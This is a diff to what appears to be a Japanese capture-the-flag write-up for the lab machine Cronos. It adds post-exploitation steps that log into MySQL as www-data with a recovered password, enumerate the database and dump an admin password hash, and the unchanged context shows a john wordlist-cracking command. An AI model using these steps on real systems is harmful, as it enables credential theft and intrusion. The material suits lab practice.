@@ -157,3 +157,61 @@ https://www.revshells.com/
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
+### データベース調査
+接続
+```
+www-data@cronos:/var/www/admin$ mysql -u admin -p
+Enter password: kEjdbRigfBHUREiNSDs
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 42
+Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> 
+```
+一覧表示
+```
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| admin              |
++--------------------+
+2 rows in set (0.00 sec)
+```
+データベース選択
+```
+mysql> use admin
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+```
+テーブル表示
+```
+mysql> show tables;
++-----------------+
+| Tables_in_admin |
++-----------------+
+| users           |
++-----------------+
+1 row in set (0.00 sec)
+```
+```
+mysql> select * from users;
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
++----+----------+----------------------------------+
+1 row in set (0.00 sec)
+```
